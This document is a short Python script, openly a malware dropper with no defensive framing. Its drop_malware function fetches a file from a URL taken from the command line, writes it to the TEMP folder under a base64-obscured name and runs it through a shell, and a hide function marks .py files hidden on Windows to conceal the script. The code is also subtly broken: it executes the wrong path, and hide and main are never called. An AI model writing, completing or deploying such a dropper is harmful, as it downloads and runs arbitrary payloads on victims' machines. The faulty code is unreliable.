import base64
import ctypes
import os
import platform
import requests
import subprocess
import sys

def execute(exe_path):
    process = subprocess.Popen(exe_path, shell=True)
    process.wait()

def hide():
    if platform.system() == 'Windows':
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        for file in os.listdir('.'):
            if file.find('.py') == len(file) - len('.py'):
                kernel32.SetFileAttributesW(file, FILE_ATTRIBUTE_HIDDEN)
    else:
        pass
    
def drop_malware(url):
    content = requests.get(url).content
    filename, fileext = os.path.splitext(url.split('/')[-1].split('#')[0].split('?')[0])
    file = '%s%s' % (base64.b64encode(filename.encode()).decode('utf-8'), fileext)
    filepath = os.path.join(os.environ['TEMP'], file)
    with open(filepath, 'wb') as f:
        f.write(content)

    execute(os.path.abspath(filename))

def main():
    drop_malware(sys.argv[1])